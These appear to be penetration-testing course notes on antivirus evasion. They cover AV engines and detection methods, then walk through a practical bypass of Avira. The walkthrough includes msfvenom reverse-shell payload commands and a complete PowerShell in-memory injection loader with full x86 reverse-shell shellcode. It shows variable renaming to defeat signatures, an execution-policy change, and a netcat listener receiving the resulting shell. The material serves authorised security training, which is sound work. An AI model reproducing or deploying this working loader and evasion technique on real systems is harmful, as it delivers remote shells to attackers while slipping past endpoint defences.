# Antivirus Evasion
In an attempt to compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems
+ As penetration testers, we must understand and be able to recreate these techniques in order to demonstrate this potential threat to our client
+ In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies
+ We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines

## Antivirus Software Key Components and Operations
_Antivirus_ (AV), is a type of application designed to prevent, detect, and remove malicious software
+ It was originally designed to simply remove computer viruses
+ However, with the development of new types of malware, like bots and _ransomware_, antivirus software now typically includes additional protections such as _IDS/IPS_, firewall, website scanners, and more

### Known vs Unknown Threats
In its original design, an antivirus software bases its operation and decisions on signatures
+ The goal of a signature is to uniquely identify a specific piece of malware
+ Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match
+ As we’ll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engin
+ For example, two signatures can be developed to contrast the exact same type of malware: 
	+ one to target the malware file on disk 
	+ and another to detect its network communication
+ The semantics of the two signatures can vary drastically as they are intended for two different AV engines
+ In 2014, a signature language named _YARA_ was open-sourced to allow researchers to query the _VirusTotal_ platform or even integrate their own malware signatures into AV products
+ VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against a number of AV products

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented
+ However, modern AV solutions, including _Windows Defender_, are shipped with a _Machine Learning_ (ML) engine that is queried whenever an unknown file is discovered on a system
+ These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers
+ Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability

To overcome these AV limitations, _Endpoint Detection and Response_ (EDR) solutions have evolved during recent years
+ EDR software is responsible for generating security-event telemetry and forwarding it to a _Security Information and Event Management_ (SIEM) system, which collects data from every company host
+ These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection
+ Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture

### AV Engines and Components 
At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet
+ Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines

A modern antivirus is typically designed around the following components:
- File Engine
- Memory Engine
- Network Engine
- Disassembler
- Emulator/Sandbox
- Browser Plugin
- Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown

The _file engine_ is responsible for both scheduled and real-time file scans
+ When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine
+ On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website
+ In order to detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted _mini-filter driver_
+ This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface
+ Once a signature is matched, a network engine might attempt to block the malware from communicating with its _Command and Control_ (C2) server

To further hinder detection, malware often employs encryption and decryption through custom routines in order to conceal its true nature
+ AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_
+ The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine
+ A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system
+ Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms

### Detection Methods
As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware

In this section, we are going to explore the following AV detection methodologies and explain how they work together.
- Signature-based Detection
- Heuristic-based Detection
- Behavioral Detection
- Machine Learning Detection

#### Signature-Based Detection 

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_
+ In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined
+ A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware
+ Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash
+ As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the _xxd_ tool by passing the **-b** argument before the file name
```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010 
```

We displayed the content of the file through the xxd utility
+ The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one
+ We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly

Now, assuming this is real malware, we want to calculate the hash of the file and we can do so through the **sha256sum** utility
```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more
```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```
+ In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string
```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```
+ Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections
+ To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products

#### Heuristic-Based Detection 
A detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious
+ This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program
+ The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious

#### Behavior-Based Detection
Alternatively, _Behavior-Based Detection_ dynamically analyzes the behavior of a binary file
+ This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, and searching for behaviors or actions that are considered malicious

#### Machine-Learning Detection
Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and analyzing additional metadata
+ For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples
+ Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively
+ Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious
+ It's worth noting that the majority of antivirus developers use a combination of these detection methods to achieve higher detection rates

#### Payload Analysis 
In order to demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload
+ Using _msfvenom_, we will generate a standard _Portable Executable_ (PE) file containing our payload. In this case we will use a simple TCP reverse shell
+ **NOTE**: The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the _Windows Loader_ to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali
+ Metasploit gets updated frequently and its AV signatures could change as well
+ AV vendors have to rebuild those signatures and push them as updates
+ This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures

Let's generate the test binary payload by running the **msfvenom** command followed by the **-p** argument specifying the payload
+ We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
```
+ Example output:
```
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Next, we will run a virus scan on this executable. Rather than installing a large number of antivirus applications on our local machine, we can upload our file to _VirusTotal_, which will scan it to determine the detection rate of various AV products
+ **NOTE**: VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission
+ See the results below:
![[Pasted image 20231024105835.png]]
+ We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section

## Transferring files from Windows to Kali  with SMB Share
Start SMB share on Kali:
```
impacket-smbserver sharedFolder ~/Desktop -smb2support -username User -password Pass
```

Connect to SMB share from windows:
```
net use \\IP\sharedFolder /u:User Pass
```
+ Then search `\\IP\sharedFolder` in the windows file explorer to connect
+ Can also transfer files to it in powershell with `cp <FILENAME> \\IP\sharedFolder`

## Bypassing Antivirus Detections 
Generally speaking, antivirus evasion falls into two broad categories: _on-disk_ and _in-memory_
+ On-disk evasion focuses on modifying malicious files physically stored on disk in an attempt to evade AV file engine detections
+ However, given the maturity of modern AV file scanning engines, modern malware often attempts in-memory operation, which avoids the disk entirely and therefore, reduces the possibility of being detected
+ In the following sections, we will give a very general overview of some of the techniques used in both of these approaches

### On-Disk Evasion
To begin our discussion of evasion, we will first inspect various techniques used to obfuscate files stored on a physical disk
+ Modern on-disk malware obfuscation can take many forms

One of the earliest ways of avoiding detection involved the use of _packers_
+ Given the high cost of disk space and slow network speeds during the early days of the internet, packers were originally designed to reduce the size of an executable
+ Unlike modern "zip" compression techniques, packers generate an executable that is not only smaller, but is also functionally equivalent with a completely new binary structure
+ The file produced has a new hash signature and as a result, can effectively bypass older and more simplistic AV scanners
+ The file produced has a new hash signature and as a result, can effectively bypass older and more simplistic AV scanners

_Obfuscators_ reorganize and mutate code in a way that makes it more difficult to reverse-engineer
+ This includes replacing instructions with semantically equivalent ones, inserting irrelevant instructions or _dead code_, splitting or reordering functions, and so on
+ Although primarily used by software developers to protect their intellectual property, this technique is also marginally effective against signature-based AV detection
+ Modern obfuscators also have runtime in-memory capabilities, which aims to hinder AV detection even further

_Crypter_ software cryptographically alters executable code, adding a decryption stub that restores the original code upon execution
+ This decryption happens in-memory, leaving only the encrypted code on-disk
+ Encryption has become foundational in modern malware as one of the *most effective* AV evasion techniques

Highly effective antivirus evasion requires a combination of all of the previous techniques in addition to other advanced ones, including _anti-reversing_, _anti-debugging_, _virtual machine emulation detection_, and so on
+ In most cases, _software protectors_ were designed for legitimate purposes, like _anti-copy_, but can also be used to bypass AV detection

Most of these techniques may appear simple at a high-level but they can be quite complex
+ Because of this, there are currently few actively-maintained free tools that provide acceptable antivirus evasion
+  Among commercially available tools, _The Enigma Protector_ in particular can be used to successfully bypass antivirus products

### In-Memory Evasion
_In-Memory Injections_,also known as _PE Injection_, is a popular technique used to bypass antivirus products on Windows machines
+ Rather than obfuscating a malicious binary, creating new sections, or changing existing permissions, this technique instead focuses on the manipulation of volatile memory
+ One of the main benefits of this technique is that it does not write any files to disk, which is a commonly focused area for most antivirus products

There are several evasion techniques that do not write files to disk
+ While we will still provide a brief explanation for some of them, we will only cover in-memory injection using _PowerShell_ in detail as the others rely on a low-level programming background in languages such as _C/C++_ and are outside of the scope of this Module

The first technique we are going to cover is _Remote Process Memory Injection_, which attempts to inject the payload into another valid PE that is not malicious
+ The most common method of doing this is by leveraging a set of _Windows APIs_
+ First, we would use the _OpenProcess_ function to obtain a valid _HANDLE_ to a target process that we have permission to access
+ After obtaining the HANDLE, we would allocate memory in the context of that process by calling a Windows API such as _VirtualAllocEx_
+ Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using _WriteProcessMemory_
+ After the payload has been successfully copied, it is usually executed in memory in a separate thread using the _CreateRemoteThread_ API

This sounds complex, but we will use a similar technique in a later example, allowing PowerShell to do the heavy lifting and a very similar but simplified attack targeting a local **powershell.exe** instance

Unlike regular _DLL injection_, which involves loading a malicious DLL from disk using the _LoadLibrary_ API, the _Reflective DLL Injection_ technique attempts to load a DLL stored by the attacker in the process memory

The main challenge of implementing this technique is that _LoadLibrary_ does not support loading a DLL from memory
+ Furthermore, the Windows operating system does not expose any APIs that can handle this either
+ Attackers who choose to use this technique must write their own version of the API that does not rely on a disk-based DLL

The third technique we want to mention is _Process Hollowing_
+ When using process hollowing to bypass antivirus software, attackers first launch a non-malicious process in a suspended state
+ Once launched, the image of the process is removed from memory and replaced with a malicious executable image
+ Finally, the process is then resumed and malicious code is executed instead of the legitimate process

Ultimately, _Inline hooking_, as the name suggests, involves modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code
+ Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed

Hooking is a technique often employed by _rootkits_, a more stealthy kind of malware
+ Rootkits aim to provide the malware author dedicated and persistent access to the target system through modification of system components in user space, kernel, or even at lower OS _protection rings_ such as _boot_ or _hypervisor_
+ Since rootkits need administrative privileges to implant its hooks, it is often installed from an elevated shell or by exploiting a privilege-escalation vulnerability

## AV Evasion in Practice 
Depending on the kind of AV we are facing during an engagement, we might want to resort to automated or manual AV evasion avenues
+ Either way, we first need to understand the pros and cons associated with these strategies
+ We are going to first understand best practices related to AV evasion and how to perform a real AV bypass along with basic manual in-memory evasion through PowerShell
+ Finally, we are going to rely on third-party tools to automate on-disk and in-memory evasion techniques

### Testing for AV Evasion 
The term _SecOps_ defines the joint collaboration between the enterprise IT department and the _Security Operations Center_ (SOC)
+ The goal of the SecOps team is to provide continuous protection and detection against both well-known and novel threats
+ As penetration tester, we want to develop a realistic understanding of the considerations facing SecOps teams when dealing with AV products
+ For this reason we should start considering a few extra implications regarding antivirus evasion development that could help us on our engagements

As an initial example, VirusTotal can give us a good glimpse of how stealthy our malware could be, once scanned, the platform sends our sample to every antivirus vendor that has an active membership
+ This means that shortly after we have submitted our sample, most of the AV vendors will be able run it inside their custom sandbox and machine learning engines to build specific detection signatures, thus rendering our offensive tooling unusable

As an alternative to VirusTotal, we should resort to _AntiScan.Me_
+ This service scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties
+ The service offers up to four scans a day and additional ones at a small fee after the daily limit has been reached

However, relying on tools such as AntiScan.Me is considered a last resort when we don't know the specifics of our target's AV vendor
+ If we do know those specifics on the other hand, we should build a dedicated VM that resembles the customer environment as closely as possible

Regardless of the tested AV product, we should always make sure to disable sample submission so that we don't incur the same drawback as VirusTotal
+ For instance, Windows Defender's _Automatic Sample Submission_ can be disabled by navigating to _Windows Security_ > _Virus & threat protection_ > _Manage Settings_ and deselecting the relative option as illustrated in the image below
![[Pasted image 20231024123711.png]]

Having such a simulated target scenario allows us to freely test AV evasion vectors without worrying about our sample being submitted for further analysis
+ Since automatic sample submission allows Windows Defender to get our sample analyzed by its machine learning cloud engines, we should only enable it once we are confident our bypasses will be effective and only if our target has sample submission enabled
+ **NOTE**: Since both Windows Defender cloud protection and automatic sample submission require internet connectivity, we should first verify that this is reflected in our target environment: some company policies mandate limited internet access to some production servers and as a consequence, some advanced AV features are inhibited

Another rule of thumb we should follow when developing AV bypasses is to always prefer custom code
+ As we have learned at the beginning of this Module, AV signatures are extrapolated from the malware sample and thus, the more novel and diversified our code is, the fewer chances we have to incur any existing detection

### Evading AV with Thread Injection
Now that we have a general understanding of the detection techniques used in antivirus software and the relative bypass methods, we can turn our focus to a practical example

Finding a universal solution to bypass all antivirus products is difficult and time consuming, if not impossible
+ Considering time limitations during a typical penetration test, it is far more efficient to target the specific antivirus product deployed in the target network

For the purposes of this Module, we will interact with _Avira Free Security_ version 1.1.68.29553 on our Windows 11 client
+ Once we connect via RDP with the provided credentials, we'll notice that Avira is already installed and can be launched from the Desktop shortcut
+ Once started, we can navigate to the _Security_ panel from the left menu and click on _Protection Options_:
![[Pasted image 20231025133504.png]]

Launching this menu section will display the currently running protections where we can verify if the _Real-Time Protection_ feature is enabled and manually enable it if needed.
![[Pasted image 20231025133605.png]]

As a first step when testing AV products, we should verify that the antivirus is working as intended. We will use the Metasploit payload we generated earlier and scan it with Avira
+ After transferring the malicious PE to our Windows client, we are almost immediately warned about the malicious content of the uploaded file
+ In this case, we are presented with an error message indicating that our file has been blocked
![[Pasted image 20231025133644.png]]

Avira displays a popup notification informing us that the file was flagged as malicious and quarantined
+ **Note**: Antivirus products typically enforce threat quarantine by blocking any file system operation at the kernel level or even storing the malicious samples in encrypted storage accessible only by the AV software. 

Depending on how restricted our target environment is, we might be able to bypass antivirus products with the help of _PowerShell_

In the following example, we will use a _remote process memory injection_ technique, similar to what we learned in the previous Learning Unit
+ The main difference lies in the fact that we will target the currently executing process, which in our case will be the x86 PowerShell interpreter

A very powerful feature of PowerShell is its ability to interact with the _Windows API_
+ This allows us to implement the in-memory injection process in a PowerShell script
+ One of the main benefits of executing a script rather than a PE is that it is difficult for antivirus manufacturers to determine if the script is malicious as it's run inside an interpreter and the script itself isn't executable code
+ Nevertheless, please keep in mind that some AV products handle malicious script detection with more success than others

Furthermore, even if the script is marked as malicious, it can easily be altered
+ Antivirus software will often review variable names, comments, and logic, all of which can be changed without the need to recompile anything

To demonstrate an introductory AV bypass, we we are going to first analyze a well-known version of the memory injection PowerShell script and then test it against Avira
+ A basic templated script that performs in-memory injection is shown in the listing below
``` Powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

The script starts by importing _VirtualAlloc_ and _CreateThread_ from **kernel32.dll** as well as _memset_ from **msvcrt.dll**
+ These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively
+ Once again, notice that we are allocating the memory and executing a new thread in the current process (powershell.exe), rather than a remote one
``` PowerShell
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
```

The script main logic starts by allocating a block of memory using _VirtualAlloc_, which takes each byte of the payload stored in the _$sc_ byte array and writes it to our newly-allocated memory block using _memset_
``` PowerShell
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
```

As a final step, our in-memory written payload is executed in a separate thread using the _CreateThread_ API
```
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Our chosen payload is missing from our script, but can be generated using **msfvenom**. We are going to keep the payload identical to the one used in previous tests for consistency
```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 699 bytes
Final size of powershell file: 3454 bytes
[Byte[]] $sc =  0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...
```

The resulting output can be copied to the final script after copying the content of the _$sc_ variable into the script.
+ Our complete script resembles the following:
``` Powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Next, we are going to verify the detection rate of our PowerShell script. Our preferred choice would be Antiscan.Me, but sadly, it does not support _ps1_ format, so we have to resort to VirusTotal.
![[Pasted image 20231025150147.png]]
+ According to the results of the VirusTotal scan, _28_ of the _59_ AV products flagged our script as malicious, including Avira. This is not as promising as expected, so we need to somewhat circumvent the AV signature logic

As mentioned, scripts are just interpreted text files. They are not easily fingerprinted like binary files, which have a more structured data format
+ In order to catch malicious scripts, AV vendors often rely on static string signatures related to meaningful code portions, such as variables or function names

To bypass this detection logic, let's give the variables of the previous script more generic names.
``` powershell
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];   
[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
+ We have updated our script by changing the _Win32_ hard-coded class name for the _Add-Type_ cmdlet to _iWin32_. Similarly, we have renamed _sc_ and _winFunc_ to _var1_ and _var2_, respectively

Once we save the PowerShell script as **bypass.ps1** and transfer it over the target Windows 11 client, we can run a Quick Scan to verify that our attack vector is undetected
+ To run the scan, we'll click on the _Security_ option on the left hand menu, select _Virus Scans_, and then click on _Scan_ under the _Quick Scan_ option
+ **NOTE**: To get sense of the detection rate, we could have uploaded the modified bypass to VirusTotal as well. However, as we learned earlier, this could jeopardize our penetration test as our sample could be analyzed and detected by the more powerful cloud-based machine learning engines.

Once Avira has scanned our script on our Windows 11 machine, it indicates our script is not malicious.
![[Pasted image 20231025150412.png]]

Since the msfvenom payload is for x86, we are going to launch the x86 version of PowerShell, named _Windows PowerShell (x86)_, as depicted in the image below.
![[Pasted image 20231025150432.png]]

Let's run **bypass.ps1** and analyze the output
```
PS C:\Users\offsec\Desktop> .\bypass.ps1
.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this
system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\bypass.ps1
+ ~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```
+ Unfortunately, when we attempt to run our malicious script, we are presented with an error that references the _Execution Policies_ of our system, which appear to prevent our script from running.
+ A quick review of the Microsoft documentation on PowerShell execution policies (linked in the error message), shows that these policies are set on a per-user rather than per-system basis
+ **NOTE**: Keep in mind that much like anything in Windows, the PowerShell Execution Policy settings can be dictated by one or more Active Directory GPOs. In those cases, it may be necessary to search for additional bypass vectors

Let's attempt to view and change the policy for our current user
+ Please note that in this instance, we have chosen to change the policy globally rather than on a per-script basis, which can be achieved by using the **-ExecutionPolicy Bypass** flag for each script when it is run
+ First, we are going to retrieve the current execution policy via the **Get-ExecutionPolicy -Scope CurrentUser** command and then set it to _Unrestricted_ via the **Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser** command
```
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined

PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```
+ The listing above shows that we have successfully changed the policy for our current user to _Unrestricted_

Before executing our script, we will start a Netcat listener on our Kali attacker machine to interact with our shell.
```
nc -lvnp 443
```

Now we will try to launch the PowerShell script:
```
PS C:\Users\offsec\Desktop> .\bypass.ps1

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Byte[]                                   System.Array
124059648
124059649
...
```

The script executes without any problems and we receive a reverse shell on our attack machine
```
kali@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.50.1] from (UNKNOWN) [192.168.50.62] 64613
Microsoft Windows [Version 10.0.22000.675]
(c) Microsoft Corporation. All rights reserved.

C:\Users\offsec>whoami
whoami
client01\offsec

C:\Users\offsec>hostname
hostname
client01
```

This means we have effectively evaded Avira detection on our target
+ In mature organizations, various machine learning software can be implemented that will try to analyze the contents of the scripts that are run on the system
+ Depending on the configuration of these systems and what they consider harmful, scripts like the one above may need to be altered or adapted for the target environment
+ Additionally, when implemented correctly with a skilled operations center, EDR systems could just silently alert the SOC team and thus, render our attack useless in a matter of minutes

### Automating the Process
